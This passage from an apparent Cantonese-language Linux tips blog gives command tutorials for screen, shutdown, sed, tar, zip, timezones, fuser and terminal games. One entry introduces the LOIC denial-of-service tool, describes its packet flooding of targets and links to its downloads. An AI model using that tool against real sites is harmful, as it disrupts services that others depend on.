<ul>
<li>冇命名 # Screen 會自動幫你起一個名俾你 (random number)。</li>
<li>有命名 # 輸入你喜歡的名稱就可以。</li>
</ul>
<div class="note info flat">
    建議自行命名，方便你辦認 Sessions。
</div> 

<h2 id="建立-Sessions-沒命名"><a href="#建立-Sessions-沒命名" class="headerlink" title="建立 Sessions (沒命名)"></a>建立 Sessions (沒命名)</h2><p>輸入 <code>screen</code> 後按下 <code>Enter</code> 就可以了。</p>
<div class="note info flat">
    此方法為隨機生成 <code>ID 和 名稱</code>。
</div> 

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen</span><br></pre></td></tr></table></figure>

<p>output :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> output</span></span><br><span class="line"></span><br><span class="line">┌─[r@parrot]─[~]</span><br><span class="line">└──╼ $screen -list</span><br><span class="line">There is a screen on:</span><br><span class="line">        2304.pts-0.parrot       (Sunday, July 03, 2022 02:10:45 PM HKT) (Attached)</span><br><span class="line">1 Socket in /run/screen/S-r.</span><br><span class="line">┌─[r@parrot]─[~]</span><br><span class="line">└──╼ $</span><br></pre></td></tr></table></figure>

<img src="screen.gif"/>

<h2 id="建立-Sessions-有命名"><a href="#建立-Sessions-有命名" class="headerlink" title="建立 Sessions (有命名)"></a>建立 Sessions (有命名)</h2><p>此方法會按照你想輸入的文字建立 Sessions 名稱。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -S your_sessions_name</span><br></pre></td></tr></table></figure>

<p>output :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> output</span></span><br><span class="line"></span><br><span class="line">┌─[r@parrot]─[~]</span><br><span class="line">└──╼ $screen -list</span><br><span class="line">There is a screen on:</span><br><span class="line">        2213.your_sessions_name (Sunday, July 03, 2022 02:05:47 PM HKT) (Attached)</span><br><span class="line">1 Socket in /run/screen/S-r.</span><br><span class="line">┌─[r@parrot]─[~]</span><br><span class="line">└──╼ $</span><br></pre></td></tr></table></figure>

<p><img src="-S.gif"></p>
<hr>
<h1 id="修改-Sessions"><a href="#修改-Sessions" class="headerlink" title="修改 Sessions"></a>修改 Sessions</h1><p>以下操作係可以改變你 Sessions 既名稱。</p>
<h2 id="修改-Sessions-名稱"><a href="#修改-Sessions-名稱" class="headerlink" title="修改 Sessions 名稱"></a>修改 Sessions 名稱</h2><p>入到去你既 Sessions 再撳 <kbd>Ctrl</kbd>+<kbd>A</kbd>,之後再撳 <kbd>:</kbd>, 之後再打 <code>sessionname newName</code> ,打完之後再撳 <kbd>Enter</kbd></p>
<div class="note info flat">
    說明：此方法需要進入 Sessions 後才能修改名稱
</div>

<p><img src="sessionname.gif"></p>
<hr>
<h1 id="Kill-Sessions"><a href="#Kill-Sessions" class="headerlink" title="Kill Sessions"></a>Kill Sessions</h1><p>方法有兩個，一個係入到去再 Kill，一個係喺出面 Kill。</p>
<h2 id="Kill-Sessions-方法一"><a href="#Kill-Sessions-方法一" class="headerlink" title="Kill Sessions (方法一)"></a>Kill Sessions (方法一)</h2><div class="note info flat">
    說明：<code>""</code> 包住既要打返你輸入 <code> sceen -list</code> 見到既名。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -X -S &quot;your_sessions_name&quot; quit</span><br></pre></td></tr></table></figure>

<p><img src="kill.png"></p>
<h2 id="Kill-Sessions-方法二"><a href="#Kill-Sessions-方法二" class="headerlink" title="Kill Sessions (方法二)"></a>Kill Sessions (方法二)</h2><p>入去你個 Sessions，再入去打：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p><img src="KILL2.gif"></p>
<hr>
<h1 id="列出存在-Sessions"><a href="#列出存在-Sessions" class="headerlink" title="列出存在 Sessions"></a>列出存在 Sessions</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -list</span><br></pre></td></tr></table></figure>

<p><img src="-list.png"></p>
<hr>
<h1 id="進入-Sessions"><a href="#進入-Sessions" class="headerlink" title="進入 Sessions"></a>進入 Sessions</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -r &quot;your_sessions_name&quot;</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="-r.gif"></p>
<h1 id="關閉至背景-detached"><a href="#關閉至背景-detached" class="headerlink" title="關閉至背景 (detached)"></a>關閉至背景 (detached)</h1><p>喺你而加既 Sessions 鍵盤撳 <kbd>Ctrl</kbd>+<kbd>A</kbd>+<kbd>D</kbd></p>
<p><img src="ad.gif"></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 熄機指令 | Poweroff</title>
    <url>/2022/01/15/Linux-poweroff-commands/</url>
    <content><![CDATA[<h1 id="Poweroff"><a href="#Poweroff" class="headerlink" title="Poweroff"></a>Poweroff</h1><p>shutdown 同 poweroff 既分別就係</p>
<p>shutdown 係會好有系統咁將你所有服務，程式熄哂之後先再幫你熄機，<br>而 poweroff 同 halt 係直接將你系統既電源切斷，強制關機。</p>
<p>除非你部機真係死左，如果唔係都建議你用 shutdown 黎熄機。</p>
<h2 id="Poweroff-熄機"><a href="#Poweroff-熄機" class="headerlink" title="Poweroff 熄機"></a>Poweroff 熄機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">poweroff</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://blog.gtwang.org/linux/how-to-shutdown-linux/">https://blog.gtwang.org/linux/how-to-shutdown-linux/</a><br><a href="https://www.ionos.com/digitalguide/server/configuration/linux-shutdown-command/">https://www.ionos.com/digitalguide/server/configuration/linux-shutdown-command/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Linux cli</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - sed 刪除特定文字</title>
    <url>/2022/01/18/Linux-sed-commands/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>問 : 如果你個 File 入面有特定既文字需要 del 走，但又有百幾行都係一樣，咁點算好？<br>特別喺用 VIM 既情形下，更加冇得用 VS CODE 呢D工具俾你用。</p>
<p>笞 : 可以用 sed 工具。</p>
<h1 id="指令例子"><a href="#指令例子" class="headerlink" title="指令例子"></a>指令例子</h1><p>del 走個 file 入面既第 87 行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;87d&#x27; hi.txt</span><br></pre></td></tr></table></figure>

<p>del 走特定文字 <code>&#39;dllm&#39;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;/dllm/d&#x27; WTF.dllm</span><br></pre></td></tr></table></figure>

<p>del 走 on99.dllm 入面既第 20-50 行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;20,50d&#x27; on99.dllm</span><br></pre></td></tr></table></figure>

<p>第 87行開始 del WTF.WTF</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;87,$d&#x27; WTF.WTF</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://www.ltsplus.com/linux/sed-delete-file-whole-line">https://www.ltsplus.com/linux/sed-delete-file-whole-line</a><br><a href="https://shengyu7697.github.io/linux-sed/">https://shengyu7697.github.io/linux-sed/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 時區更改/檢查</title>
    <url>/2022/01/09/Linux-set-or-change-timezone/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用正確的時區對於許多與系統相關的任務和流程非常重要，例如寫程式時 Import time，如果時間錯了，程式會有很大影響。</p>
<p>在 Linux 上，系統的時區是在安裝過程中設置的，但也可以安裝後輕鬆更改。</p>
<h1 id="檢查當前時區"><a href="#檢查當前時區" class="headerlink" title="檢查當前時區"></a>檢查當前時區</h1><p><code>timedatectl</code> 是一個命令行實用程序，可讓您查看和更改系統的時間和日期。 它適用於所有現代基於 systemd 的 Linux 系統： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> timedatectl</span></span><br><span class="line">        Local time: Di 2015-04-07 16:26:56 CEST</span><br><span class="line">    Universal time: Di 2015-04-07 14:26:56 UTC</span><br><span class="line">        RTC time: Di 2015-04-07 14:26:56</span><br><span class="line">        Time zone: Europe/Berlin (CEST, +0200)</span><br><span class="line">Network time on: yes</span><br><span class="line">NTP synchronized: yes</span><br><span class="line">RTC in local TZ: no</span><br></pre></td></tr></table></figure>

<h1 id="檢查所有可用時區格式"><a href="#檢查所有可用時區格式" class="headerlink" title="檢查所有可用時區格式"></a>檢查所有可用時區格式</h1><p>在更改時區之前，您需要找出要使用的時區的名稱，時區使用 “地區/城市” 格式。</p>
<p>要列出所有可用時區，用帶有 list-timezones 選項的 timedatectl 命令： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> timedatectl list-timezones</span></span><br><span class="line"></span><br><span class="line">America/Tijuana</span><br><span class="line">America/Toronto</span><br><span class="line">America/Tortola</span><br><span class="line">America/Vancouver</span><br><span class="line">America/Whitehorse</span><br><span class="line">America/Winnipeg</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="更改時區"><a href="#更改時區" class="headerlink" title="更改時區"></a>更改時區</h1><p>格式如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-timezone your_time_zone</span><br></pre></td></tr></table></figure>

<p>將系統的時區更改為美國/多倫多 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-timezone America/Toronto</span><br></pre></td></tr></table></figure>

<p>Once you complete then run <code>timedatectl</code> you will see your timezone will be change to America/Toronto.</p>
<p>參考資料 :<br><a href="https://linuxize.com/post/how-to-set-or-change-timezone-on-centos-8/">https://linuxize.com/post/how-to-set-or-change-timezone-on-centos-8/</a><br><a href="https://manpages.ubuntu.com/manpages/bionic/zh_TW/man1/timedatectl.1.html">https://manpages.ubuntu.com/manpages/bionic/zh_TW/man1/timedatectl.1.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - 關機指令 | Shutdown</title>
    <url>/2022/01/15/Linux-shutdown-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>熄機要左搵右搵粒制喺邊真係好煩…</p>
<p>打指令算數啦…</p>
<h2 id="即刻熄機"><a href="#即刻熄機" class="headerlink" title="即刻熄機"></a>即刻熄機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown now</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h now</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h +0</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h 0</span><br></pre></td></tr></table></figure>

<h2 id="指定時間關機"><a href="#指定時間關機" class="headerlink" title="指定時間關機"></a>指定時間關機</h2><p>設定夜晚 21:30 分熄機。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h 21:30</span><br></pre></td></tr></table></figure>

<h1 id="SSH-指定時間熄機"><a href="#SSH-指定時間熄機" class="headerlink" title="SSH 指定時間熄機"></a>SSH 指定時間熄機</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h 21:30 &amp;</span><br></pre></td></tr></table></figure>

<h2 id="關機並送出警告訊息給所有使用者"><a href="#關機並送出警告訊息給所有使用者" class="headerlink" title="關機並送出警告訊息給所有使用者"></a>關機並送出警告訊息給所有使用者</h2><p>在十分鐘之後關機，並送出一段訊息給所有目前還在登入中的使用者：</p>
<p>十分鐘之後熄機，並且 Send 個 Message 俾所有仲登入緊既 User</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -h +10 &quot;Development server is going down for maintenance. Please save your work ASAP.&quot;</span><br></pre></td></tr></table></figure>

<h2 id="消除指定時間"><a href="#消除指定時間" class="headerlink" title="消除指定時間"></a>消除指定時間</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -c</span><br></pre></td></tr></table></figure>

<h2 id="模擬關機"><a href="#模擬關機" class="headerlink" title="模擬關機"></a>模擬關機</h2><p>有時你想 Test 下，並唔係真係想熄機你可以咁樣做</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -k 18:30</span><br></pre></td></tr></table></figure>

<p>然後系統就會出呢個 Message</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Broadcast message from seal@steteo1</span><br><span class="line">(/dev/pts/0) at 16:50 ...</span><br><span class="line">The system is going down for maintenance in 100 minutes!</span><br></pre></td></tr></table></figure>

<p>睇到呢個 Message之後，就唔會再熄機，俾你用黎 Test 個指令有冇問題。</p>
<h2 id="重新開機"><a href="#重新開機" class="headerlink" title="重新開機"></a>重新開機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h3 id="睇熄機既時間"><a href="#睇熄機既時間" class="headerlink" title="睇熄機既時間"></a>睇熄機既時間</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last -x shutdown</span><br></pre></td></tr></table></figure>

<h3 id="睇重新開機既時間"><a href="#睇重新開機既時間" class="headerlink" title="睇重新開機既時間"></a>睇重新開機既時間</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">last -x reboot</span><br></pre></td></tr></table></figure>

<p><a href="https://www.ionos.com/digitalguide/server/configuration/linux-shutdown-command/">https://www.ionos.com/digitalguide/server/configuration/linux-shutdown-command/</a><br><a href="https://blog.gtwang.org/linux/how-to-shutdown-linux/">https://blog.gtwang.org/linux/how-to-shutdown-linux/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>熄機</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - tar 壓縮檔案工具</title>
    <url>/2022/01/14/Linux-tar-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺 Windows 上大部分見到既壓縮檔都係 <code>zip</code> <code>7z</code> 呢啲檔名<br>但係喺 Linux 入面大部分情況都唔會見到呢啲，會係用 <code>tar</code> <code>tar.gz</code> 呢啲名<br>今個 Post 就係會講點樣喺 Linux 用 Tar 呢個工具喺 Linux度 解壓檔 打包檔案。</p>
<h1 id="tar"><a href="#tar" class="headerlink" title=".tar"></a>.tar</h1><p>存取 tar 格式的套件名稱為「tar」，此格式僅進行打包，並沒有使用壓縮。</p>
<p>解壓縮</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar xvf Hello.tar</span><br></pre></td></tr></table></figure>

<p>打包 (無壓縮)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar cvf Hello.tar DirName</span><br></pre></td></tr></table></figure>

<h1 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h1><p>存取 .tar.gz 格式的套件為「gzip」，此格式會進行打包並且壓縮。</p>
<p>解壓縮</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf File.tar.gz</span><br></pre></td></tr></table></figure>

<p>壓縮</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zcvf File.tar.gz DirName</span><br></pre></td></tr></table></figure>

<h2 id="詳解說明："><a href="#詳解說明：" class="headerlink" title="詳解說明："></a>詳解說明：</h2><p>.tar 代表該文件僅打包，並未壓縮！<br>若為 .tar.gz 則表示除了打包之外，還使用gzip進行壓縮！<br>因此後者在解壓縮時需在指令前方再加上一個 z 以便透過gzip來運行。</p>
<p>不過通常在網路上找到的相關資料都會是經過壓縮的，<br>而遇到.tar 的操作方式也僅與 .tar.gz 差別在於，指令最前方加上一個 z 而已。</p>
<p>指令說明：</p>
<p>z：透過gzip去進行壓縮或解壓縮<br>c：建立一個新檔案<br>x：從檔案中提取</p>
<h1 id="tgz"><a href="#tgz" class="headerlink" title=".tgz"></a>.tgz</h1><p>Create a compressed tar archive</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -czf Filename.tgz your_files</span><br></pre></td></tr></table></figure>

<p>if it’s a large folder</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -czvf Filename.tgz your_files</span><br></pre></td></tr></table></figure>

<p>Uncompress a tar archive</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf File.tgz</span><br></pre></td></tr></table></figure>

<h1 id="How-do-I-view-files-stored-in-an-archive"><a href="#How-do-I-view-files-stored-in-an-archive" class="headerlink" title="How do I view files stored in an archive?"></a>How do I view files stored in an archive?</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -ztvf file.tar.gz</span><br><span class="line">tar -jtvf file.tar.bz2</span><br></pre></td></tr></table></figure>



<p>參考資料:<br><a href="https://richarlin.tw/blog/linux-tar/">https://richarlin.tw/blog/linux-tar/</a><br><a href="https://www.cyberciti.biz/faq/how-to-tar-a-file-in-linux-using-command-line/">https://www.cyberciti.biz/faq/how-to-tar-a-file-in-linux-using-command-line/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>壓縮</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - Terminal 小遊戲</title>
    <url>/2022/01/16/Linux-terminal-games/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成日對 Server 對 Terminal 指令，<br>都真係幾唔放鬆，但唔緊要，Terminal 其實都有 Game 玩<br>以下介紹幾款俾大家！</p>
<h1 id="1-Bastet"><a href="#1-Bastet" class="headerlink" title="1. Bastet"></a>1. Bastet</h1><p>俄羅斯方塊。</p>
<h4>下載</h4>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install bastet -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/16/Linux-terminal-games/Bastet1.png" class="">

<h1 id="2-Pacman4console"><a href="#2-Pacman4console" class="headerlink" title="2. Pacman4console"></a>2. Pacman4console</h1><p>食鬼。</p>
<h4>下載</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install pacman4console -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/16/Linux-terminal-games/%E9%A3%9F%E9%AC%BC.png" class="">


<h1 id="3-nSnake"><a href="#3-nSnake" class="headerlink" title="3. nSnake"></a>3. nSnake</h1><p>貪食蛇。</p>
<h4>下載</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install nsnake -y</span><br></pre></td></tr></table></figure>

<img src="/2022/01/16/Linux-terminal-games/nsnake.png" class="">


<p>參考資料:<br><a href="https://kknews.cc/game/pezn8gz.html">https://kknews.cc/game/pezn8gz.html</a><br><a href="https://itsfoss.com/best-command-line-games-linux/">https://itsfoss.com/best-command-line-games-linux/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux - unzip zip 壓縮檔案工具</title>
    <url>/2022/01/14/Linux-unzip-zip-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要在 Linux 系統 下解壓及壓縮 Windows 上的 zip 檔，可以使用 zip 及 unzip 工具。</p>
<h1 id="安裝-APT"><a href="#安裝-APT" class="headerlink" title="安裝 (APT)"></a>安裝 (APT)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install unzip -y</span><br></pre></td></tr></table></figure>

<h2 id="加至壓縮檔案中"><a href="#加至壓縮檔案中" class="headerlink" title="加至壓縮檔案中"></a>加至壓縮檔案中</h2><p>使用 -r 參數，<br>為 zip 檔建立名稱，<br>要加入的檔案。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -r newfile.zip files1.txt files2.txt</span><br></pre></td></tr></table></figure>

<h2 id="加至壓縮檔案中-有密碼"><a href="#加至壓縮檔案中-有密碼" class="headerlink" title="加至壓縮檔案中 (有密碼)"></a>加至壓縮檔案中 (有密碼)</h2><p>使用 -p 參數，<br>輸入你要打的密碼，<br>為 zip 檔建立名稱，<br>要加入的檔案。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -p mypassword passwordprotect.zip files1.txt</span><br></pre></td></tr></table></figure>

<h2 id="解壓縮檔案"><a href="#解壓縮檔案" class="headerlink" title="解壓縮檔案"></a>解壓縮檔案</h2><p>決定你要解壓的檔案名稱</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip newfile.zip</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://www.ltsplus.com/linux/linux-zip-unzip">https://www.ltsplus.com/linux/linux-zip-unzip</a><br><a href="https://stackoverflow.com/questions/42186512/unzip-password-protected-zip-in-unix">https://stackoverflow.com/questions/42186512/unzip-password-protected-zip-in-unix</a><br><a href="https://www.tecmint.com/create-password-protected-zip-file-in-linux/">https://www.tecmint.com/create-password-protected-zip-file-in-linux/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>壓縮</tag>
      </tags>
  </entry>
  <entry>
    <title>Loic 低軌道離子炮 - DoS 網路測試工具</title>
    <url>/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/</url>
    <content><![CDATA[<h1 id="LOIC"><a href="#LOIC" class="headerlink" title="LOIC"></a>LOIC</h1><p>Low Orbit Ion Cannon (LOIC) 是一個用 C# 編寫的開源網絡壓力測試和拒絕服務攻擊應用程序。<br>LOIC 通過向服務器發送 TCP、UDP 或 HTTP 數據包來對目標站點執行 DoS 攻擊，目的是中斷特定主機的服務。</p>
<p>【軟件名稱】：Low Orbit Ion Cannon (LOIC)<br>【支援系統】：Windows 7 或以上<br>【軟件語言】：英文<br>【Github】：<a href="https://github.com/NewEraCracker/LOIC/">按這裡</a><br>【下載軟件】：<a href="https://github.com/NewEraCracker/LOIC/releases/tag/2.0.0.4-1">按這裡</a></p>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/loic.png" class="">]]></content>
      <categories>
        <category>工具介紹</category>
      </categories>
      <tags>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title>Liunx - fuser 查檔案 Socket</title>
    <url>/2022/01/09/Liunx-fuser-commands/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>fuser 是用於查詢正在使用某個檔案、目錄或socket的程式，提供有關擁有該程式的使用者和訪問型別的資訊。<br>fuser工具顯示了使用指定檔案或檔案系統的每個程式的程式 ID (PID)。</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install psmisc -y</span><br></pre></td></tr></table></figure>

<h1 id="help"><a href="#help" class="headerlink" title="help"></a>help</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser --<span class="built_in">help</span></span></span><br><span class="line">Usage: fuser [-fMuvw] [-a|-s] [-4|-6] [-c|-m|-n SPACE] [-k [-i] [-SIGNAL]] NAME...</span><br><span class="line">       fuser -l</span><br><span class="line">       fuser -V</span><br><span class="line">Show which processes use the named files, sockets, or filesystems.</span><br><span class="line"></span><br><span class="line">  -a,--all              display unused files too</span><br><span class="line">  -i,--interactive      ask before killing (ignored without -k)</span><br><span class="line">  -k,--kill             kill processes accessing the named file</span><br><span class="line">  -l,--list-signals     list available signal names</span><br><span class="line">  -m,--mount            show all processes using the named filesystems or block device</span><br><span class="line">  -M,--ismountpoint     fulfill request only if NAME is a mount point</span><br><span class="line">  -n,--namespace SPACE  search in this name space (file, udp, or tcp)</span><br><span class="line">  -s,--silent           silent operation</span><br><span class="line">  -SIGNAL               send this signal instead of SIGKILL</span><br><span class="line">  -u,--user             display user IDs</span><br><span class="line">  -v,--verbose          verbose output</span><br><span class="line">  -w,--writeonly        kill only processes with write access</span><br><span class="line">  -V,--version          display version information</span><br><span class="line">  -4,--ipv4             search IPv4 sockets only</span><br><span class="line">  -6,--ipv6             search IPv6 sockets only</span><br><span class="line">  -                     reset options</span><br><span class="line"></span><br><span class="line">  udp/tcp names: [local_port][,[rmt_host][,[rmt_port]]]</span><br></pre></td></tr></table></figure>

<h2 id="檢查指定-Port-Number"><a href="#檢查指定-Port-Number" class="headerlink" title="檢查指定 Port Number"></a>檢查指定 Port Number</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser 8080/tcp</span><br></pre></td></tr></table></figure>

<h2 id="終止指定-Port-Number-執行-tcp的程式"><a href="#終止指定-Port-Number-執行-tcp的程式" class="headerlink" title="終止指定 Port Number 執行 tcp的程式"></a>終止指定 Port Number 執行 tcp的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser -k 8080/tcp</span><br></pre></td></tr></table></figure>

<h2 id="檢視某個目錄的程式"><a href="#檢視某個目錄的程式" class="headerlink" title="檢視某個目錄的程式"></a>檢視某個目錄的程式</h2><p>fuser序可以與 <code>-v</code> 選項一起使用，該選項以詳細模式執行該工具。<br>verbose選項用於在計算機螢幕上生成詳細輸出，因此使用者可以實時檢視實用程式正在執行的操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v .</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">/home/winbert:       winbert    1435 ..c.. bash</span><br></pre></td></tr></table></figure>

<h2 id="檢視已使用-tcp-或-udp-Port的程式"><a href="#檢視已使用-tcp-或-udp-Port的程式" class="headerlink" title="檢視已使用 tcp 或 udp Port的程式"></a>檢視已使用 <code>tcp</code> 或 <code>udp</code> Port的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v -n tcp 80</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">80/tcp:              root      27411 F.... docker-proxy</span><br></pre></td></tr></table></figure>


<p>參考資料 :<br><a href="https://iter01.com/513597.html">https://iter01.com/513597.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Port</tag>
      </tags>
  </entry>
  <entry>
    <title>MacOS - 安裝 OpenVanilla</title>
    <url>/2022/01/16/MacOS-install-OpenVanilla/</url>
    <content><![CDATA[<img src="/img/Post/image/MacOS/cover.png" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下內容轉自 OpenVanilla 官網。</p>
<p><a href="https://openvanilla.org/">OpenVanilla</a> 是一套為 Mac 設計的輸入法套件。<br>內建的輸入法包括了倉頡、簡易（速成）、大易、行列、符號與日文假名、粵拼共六種。<br>使用者可透過偏好設定，匯入其他輸入法的表格，來建立符合自己需要的輸入法。</p>
<h1 id="檔案"><a href="#檔案" class="headerlink" title="檔案"></a>檔案</h1><p>最新版本: 1.6.2 <a href="https://github.com/openvanilla/openvanilla/releases/download/1.6.2/OpenVanilla-Installer-Mac-1.6.2.zip">由此處下載</a><br>發布日期: 2021-11-25<br>MD5 hash: 0d4a197f0a3f2c1b95b891e1867190c3<br>新版摘要：支援新版 macOS、.cin 表格新功能、選字窗問題修正。<a href="https://github.com/openvanilla/openvanilla/releases/tag/1.6.2">詳細說明</a> </p>
<h2 id="系統需求"><a href="#系統需求" class="headerlink" title="系統需求"></a>系統需求</h2><p>OpenVanilla 並不是所有 macOS 也可以安裝，以下是安裝系統需求 : </p>
<ul>
<li>macOS 10.10 以上（含）版本</li>
</ul>
<h1 id="解除安裝"><a href="#解除安裝" class="headerlink" title="解除安裝"></a>解除安裝</h1><p>要解除安裝 OpenVanilla，請在 Finder 視窗中按著  鍵 (Command 鍵) 不放，繼續按 Shift 鍵和 G 鍵 (Cmd-Shift-G)，這時會出現對話框，打入 ~/Library/Input Methods/ 按下 Enter 鍵，這時會跳出一個資料夾，將裡面的 OpenVanilla 檔拖入垃圾桶，登出目前帳號再登入即可。</p>
<h1 id="安裝方式"><a href="#安裝方式" class="headerlink" title="安裝方式"></a>安裝方式</h1><p>下載最新版本，瀏覽器解壓縮安裝包後，會看到「安裝 OpenVanilla」的安裝程式 (dmg檔)。<br>執行安裝程式後，即可從螢幕右上方的輸入法選單（所謂的國旗選單）選取 OpenVanilla。</p>
<p>第一次安裝，預設的輸入法為倉頡。使用者可依需要選取內建輸入法，或是從「OpenVanilla 偏好設定…」中匯入自己所需的輸入法。</p>
